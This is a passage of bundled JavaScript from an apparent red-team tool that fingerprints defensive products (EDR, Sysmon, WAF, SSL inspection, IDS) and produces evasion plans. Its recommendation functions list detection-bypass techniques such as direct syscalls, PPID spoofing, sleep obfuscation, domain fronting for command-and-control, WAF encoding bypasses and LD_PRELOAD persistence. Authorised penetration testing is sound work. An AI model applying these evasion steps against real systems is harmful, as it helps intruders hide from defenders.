          return { type: "config", name: indicator.type, value: cmd.output.slice(0, 500) };
        }
      }
      for (const r of input.registryKeys || []) {
        if (pattern.test(r.path) || pattern.test(r.valueData || "")) {
          return { type: "registry", name: r.path, value: r.valueData || "" };
        }
      }
      break;
    case "cert_issuer":
      for (const c of input.certificates || []) {
        if (pattern.test(c.issuer)) {
          return { type: "certificate", name: "TLS Certificate", value: c.issuer, raw: `Subject: ${c.subject}, Serial: ${c.serialNumber || "N/A"}` };
        }
      }
      break;
    case "http_header":
      for (const h of input.httpHeaders || []) {
        if (pattern.test(h.name) || pattern.test(h.value)) {
          return { type: "header", name: h.name, value: h.value, raw: h.url ? `URL: ${h.url}` : void 0 };
        }
      }
      break;
    case "response_pattern":
      for (const h of input.httpHeaders || []) {
        if (pattern.test(h.value)) {
          return { type: "behavior", name: "Response Pattern", value: h.value.slice(0, 200) };
        }
      }
      for (const nb of input.networkBehaviors || []) {
        if (pattern.test(nb.description) || pattern.test(nb.evidence || "")) {
          return { type: "behavior", name: nb.type, value: nb.description };
        }
      }
      break;
    case "dns_pattern":
    case "port_behavior":
    case "user_agent":
      for (const nb of input.networkBehaviors || []) {
        if (pattern.test(nb.description) || pattern.test(nb.evidence || "")) {
          return { type: "network", name: nb.type, value: nb.description };
        }
      }
      break;
  }
  for (const tech of input.technologies || []) {
    if (pattern.test(tech)) {
      return { type: "behavior", name: "Technology Detection", value: tech };
    }
  }
  if (input.wafDetected && pattern.test(input.wafDetected)) {
    return { type: "header", name: "WAF Detection", value: input.wafDetected };
  }
  for (const rs of input.riskSignals || []) {
    if (pattern.test(rs.rationale) || pattern.test(rs.type)) {
      return { type: "behavior", name: rs.type, value: rs.rationale };
    }
  }
  return null;
}
function calculateConfidence(matches) {
  if (matches.length === 0) return { level: "unconfirmed", score: 0, rationale: "No indicators matched" };
  const maxConfidence = Math.max(...matches.map((m) => m.indicator.confidence));
  const corroborationBoost = Math.min(0.05 * (matches.length - 1), 0.15);
  const evidenceTypes = new Set(matches.map((m) => m.evidence.type));
  const diversityBoost = Math.min(0.03 * (evidenceTypes.size - 1), 0.1);
  const finalScore = Math.min(maxConfidence + corroborationBoost + diversityBoost, 1);
  let level;
  if (finalScore >= 0.95) level = "confirmed";
  else if (finalScore >= 0.8) level = "high";
  else if (finalScore >= 0.5) level = "medium";
  else if (finalScore >= 0.2) level = "low";
  else level = "unconfirmed";
  const evidenceList = matches.map((m) => `${m.evidence.type}:${m.evidence.name}`).join(", ");
  const rationale = `${matches.length} indicator(s) matched (${evidenceList}). Base: ${(maxConfidence * 100).toFixed(0)}%, corroboration: +${(corroborationBoost * 100).toFixed(0)}%, diversity: +${(diversityBoost * 100).toFixed(0)}%`;
  return { level, score: finalScore, rationale };
}
function generateOpsecRecommendations(vendor) {
  const recs = [];
  if (vendor.domain === "endpoint" && vendor.category === "EDR") {
    recs.push(`Avoid touching disk \u2014 use in-memory execution only`);
    recs.push(`Use direct/indirect syscalls to bypass ${vendor.product} userland hooks`);
    recs.push(`Test payloads in lab against ${vendor.product} before deployment`);
    recs.push(`Consider sleep obfuscation to evade ${vendor.product} memory scanning`);
    if (vendor.vendor === "CrowdStrike") {
      recs.push(`CrowdStrike OverWatch may detect manual adversary behavior \u2014 automate operations`);
    }
    if (vendor.vendor === "SentinelOne") {
      recs.push(`SentinelOne behavioral AI tracks process lineage \u2014 use PPID spoofing`);
    }
  }
  if (vendor.domain === "host") {
    recs.push(`Extract ${vendor.product} configuration to identify monitoring gaps`);
    recs.push(`Operate within exclusion rules when possible`);
    if (vendor.product === "Sysmon") {
      recs.push(`Check Sysmon config for excluded process names and paths`);
    }
  }
  if (vendor.domain === "network") {
    recs.push(`Use encrypted channels to bypass ${vendor.product} inspection`);
    if (vendor.category === "WAF") {
      recs.push(`Attempt origin IP discovery to bypass WAF entirely`);
      recs.push(`Use encoding/obfuscation techniques for WAF rule bypass`);
    }
    if (vendor.category === "SSL Inspection") {
      recs.push(`Use certificate pinning detection before sending sensitive C2 traffic`);
      recs.push(`Consider domain fronting or CDN tunneling for C2`);
    }
  }
  return recs;
}
function buildSummary(findings) {
  const byDomain = { endpoint: 0, host: 0, network: 0 };
  const byConfidence = { confirmed: 0, high: 0, medium: 0, low: 0, unconfirmed: 0 };
  const vendorCounts = /* @__PURE__ */ new Map();
  for (const f of findings) {
    byDomain[f.domain]++;
    byConfidence[f.confidence.level]++;
    const key = `${f.vendor}:${f.product}`;
    const existing = vendorCounts.get(key);
    if (existing) existing.count++;
    else vendorCounts.set(key, { vendor: f.vendor, product: f.product, count: 1 });
  }
  let overallPosture = "unknown";
  const edrCount = findings.filter((f) => f.category === "EDR").length;
  const hostMonCount = findings.filter((f) => f.domain === "host").length;
  const networkCount = findings.filter((f) => f.domain === "network").length;
  if (edrCount >= 2 && hostMonCount >= 2 && networkCount >= 2) overallPosture = "hardened";
  else if (edrCount >= 1 && (hostMonCount >= 1 || networkCount >= 1)) overallPosture = "moderate";
  else if (findings.length > 0) overallPosture = "weak";
  let riskToRedTeam = "low";
  const blockingFindings = findings.filter((f) => f.operationalImpact === "blocks_exploitation");
  if (blockingFindings.length >= 3) riskToRedTeam = "critical";
  else if (blockingFindings.length >= 2) riskToRedTeam = "high";
  else if (blockingFindings.length >= 1) riskToRedTeam = "medium";
  return {
    totalFindings: findings.length,
    byDomain,
    byConfidence,
    topVendors: Array.from(vendorCounts.values()).sort((a, b) => b.count - a.count),
    overallPosture,
    riskToRedTeam
  };
}
function buildEvasionStrategy(findings) {
  const priorities = [];
  const c2Recs = [];
  const payloadRecs = [];
  const persistenceRecs = [];
  const impactOrder = {
    blocks_exploitation: 4,
    monitors_c2: 3,
    degrades_stealth: 2,
    limits_persistence: 2,
    logs_activity: 1,
    minimal: 0
  };
  const sorted = [...findings].sort((a, b) => (impactOrder[b.operationalImpact] || 0) - (impactOrder[a.operationalImpact] || 0));
  for (const finding of sorted) {
    const bestEvasion = finding.evasionPlaybook.sort((a, b) => {
      const diffOrder = { trivial: 0, easy: 1, moderate: 2, hard: 3, expert: 4 };
      const riskOrder = { low: 0, medium: 1, high: 2, critical: 3 };
      return (diffOrder[a.difficulty] || 2) + (riskOrder[a.opsecRisk] || 1) - (diffOrder[b.difficulty] || 2) - (riskOrder[b.opsecRisk] || 1);
    })[0];
    if (bestEvasion) {
      priorities.push({
        finding: `${finding.vendor} ${finding.product}`,
        technique: bestEvasion.name,
        rationale: bestEvasion.description,
        difficulty: bestEvasion.difficulty
      });
    }
  }
  const hasSSLInspection = findings.some((f) => f.category === "SSL Inspection");
  const hasWAF = findings.some((f) => f.category === "WAF");
  const hasIDS = findings.some((f) => f.category === "IDS/IPS");
  const hasNGFW = findings.some((f) => f.category === "NGFW");
  if (hasSSLInspection) {
    c2Recs.push("Use domain fronting or CDN-based C2 to bypass SSL inspection");
    c2Recs.push("Implement certificate pinning checks before C2 communication");
  }
  if (hasIDS || hasNGFW) {
    c2Recs.push("Use encrypted C2 channels (HTTPS with legitimate cert, DoH for DNS tunneling)");
    c2Recs.push("Implement high-jitter beaconing to avoid pattern detection");
    c2Recs.push("Fragment C2 traffic to evade signature-based IDS rules");
  }
  if (hasWAF) {
    c2Recs.push("Attempt origin IP discovery to bypass WAF for web-based attacks");
    c2Recs.push("Use encoding techniques (double URL encoding, Unicode) for WAF bypass");
  }
  if (!hasSSLInspection && !hasIDS) {
    c2Recs.push("Standard HTTPS C2 should work \u2014 no deep inspection detected");
  }
  const edrFindings = findings.filter((f) => f.category === "EDR");
  if (edrFindings.length > 0) {
    payloadRecs.push("Use in-memory-only execution \u2014 avoid touching disk");
    payloadRecs.push("Implement direct/indirect syscalls to bypass userland hooks");
    payloadRecs.push("Use sleep obfuscation (Ekko/Foliage) to evade memory scanning");
    payloadRecs.push("Test all payloads against detected EDR in lab before deployment");
    for (const edr of edrFindings) {
      payloadRecs.push(`Specific: ${edr.vendor} ${edr.product} \u2014 review evasion playbook for product-specific techniques`);
    }
  } else {
    payloadRecs.push("No EDR detected \u2014 standard payloads may work, but verify with initial low-risk test");
  }
  const hostFindings = findings.filter((f) => f.domain === "host");
  if (hostFindings.some((f) => f.product === "Sysmon")) {
    persistenceRecs.push("Extract Sysmon config to find unmonitored persistence locations");
    persistenceRecs.push("Avoid common persistence paths (Run keys, Scheduled Tasks) if monitored by Sysmon");
  }
  if (hostFindings.some((f) => f.product.includes("auditd"))) {
    persistenceRecs.push("Use in-memory persistence (LD_PRELOAD, shared object injection) to avoid file-based audit rules");
  }
  if (hostFindings.some((f) => f.category.includes("FIM"))) {
    persistenceRecs.push("Time persistence writes between FIM check intervals");
  }
  if (hostFindings.length === 0) {
    persistenceRecs.push("No host monitoring detected \u2014 standard persistence techniques should work");
  }
  const approach = edrFindings.length > 0 ? `Environment has ${edrFindings.length} EDR product(s) detected. Prioritize userland hook bypass and in-memory execution. ${hasSSLInspection ? "Network traffic is SSL-inspected \u2014 use domain fronting for C2." : ""} ${hostFindings.length > 0 ? `${hostFindings.length} host monitoring tool(s) detected \u2014 extract configs for gap analysis.` : ""}` : `No EDR detected on target. ${hasWAF ? "WAF present \u2014 focus on WAF bypass for web attacks." : "Standard exploitation approach should work."} ${hostFindings.length > 0 ? "Host monitoring present \u2014 review persistence strategy." : ""}`;
  return { approach, priorities, c2Recommendations: c2Recs, payloadRecommendations: payloadRecs, persistenceRecommendations: persistenceRecs };
}
function buildFingerprintInputFromEngagement(data) {
  const input = {
    scanId: data.scanId,
    target: data.target,
    processes: [],
    services: [],
    drivers: [],
    registryKeys: [],
    files: [],
    dlls: [],
    httpHeaders: [],
    certificates: [],
    networkBehaviors: [],
    commandOutputs: [],
    technologies: [],
    riskSignals: []
  };
  for (const asset of data.assets || []) {
    if (asset.technologies) {
      for (const t of asset.technologies) {
        if (typeof t === "string" && !input.technologies.includes(t)) {
          input.technologies.push(t);
        }
      }
    }
    if (asset.wafDetected) input.wafDetected = asset.wafDetected;
    if (asset.passiveRecon?.wafDetected) input.wafDetected = asset.passiveRecon.wafDetected;
    if (asset.headers && typeof asset.headers === "object") {
      for (const [name, value] of Object.entries(asset.headers)) {
        if (typeof value === "string") {
          input.httpHeaders.push({ name, value, url: asset.url || asset.hostname });
        }
      }
    }
    if (asset.passiveRecon?.certificates) {
      for (const cert of asset.passiveRecon.certificates) {
        input.certificates.push({
          subject: cert.subject || cert.name || "",
          issuer: cert.issuer || "",
          serialNumber: cert.serialNumber
        });
      }
    }
    if (asset.passiveRecon?.riskSignals) {
      for (const rs of asset.passiveRecon.riskSignals) {
        input.riskSignals.push({
          type: rs.type || rs.signalType || "unknown",
          severity: rs.severity || "info",
          rationale: rs.rationale || rs.description || ""
        });
      }
    }
  }
  if (data.agentData) {
    if (data.agentData.processes) input.processes = data.agentData.processes;
    if (data.agentData.services) input.services = data.agentData.services;
    if (data.agentData.drivers) input.drivers = data.agentData.drivers;
    if (data.agentData.registryKeys) input.registryKeys = data.agentData.registryKeys;
    if (data.agentData.dlls) input.dlls = data.agentData.dlls;
    if (data.agentData.commandOutputs) input.commandOutputs = data.agentData.commandOutputs;
  }
  for (const finding of data.findings || []) {
    if (finding.technology && !input.technologies.includes(finding.technology)) {
      input.technologies.push(finding.technology);
    }
    if (finding.headers && typeof finding.headers === "object") {
      for (const [name, value] of Object.entries(finding.headers)) {
        if (typeof value === "string") {
          input.httpHeaders.push({ name, value });
        }
      }
    }
  }
  return input;
}
function buildFingerprintInputFromDIScan(data) {
  const input = {
    scanId: data.scan?.id ? `di-${data.scan.id}` : void 0,
    target: data.target || data.scan?.primaryDomain,
    httpHeaders: [],
    certificates: [],
    technologies: [],
    riskSignals: [],
    networkBehaviors: []
  };
  for (const asset of data.assets || []) {
    const techs = asset.technologies || asset.detectedTechnologies?.map((t) => t.name) || [];
    for (const t of techs) {
      if (typeof t === "string" && !input.technologies.includes(t)) {
        input.technologies.push(t);
      }
    }
    if (asset.wafDetected) input.wafDetected = asset.wafDetected;
    if (asset.headers && typeof asset.headers === "object") {
      for (const [name, value] of Object.entries(asset.headers)) {
        if (typeof value === "string") {
          input.httpHeaders.push({ name, value, url: asset.url || asset.hostname });
        }
      }
    }
    if (asset.postureFindings) {
      for (const pf of asset.postureFindings) {
        if (pf.category === "certificate" || pf.title?.toLowerCase().includes("certificate")) {
          input.certificates.push({
            subject: pf.evidence?.subject || asset.hostname || "",
            issuer: pf.evidence?.issuer || pf.description || ""
          });
        }
      }
    }
    if (asset.contextIndicators) {
      for (const ci of asset.contextIndicators) {
        input.riskSignals.push({
          type: ci.type || "context",
          severity: ci.severity || "info",
          rationale: ci.description || ci.rationale || ""
        });
      }
    }
  }
  return input;
}

export {
  VENDOR_DATABASE,
  fingerprintInterceptions,
  buildFingerprintInputFromEngagement,
  buildFingerprintInputFromDIScan
};
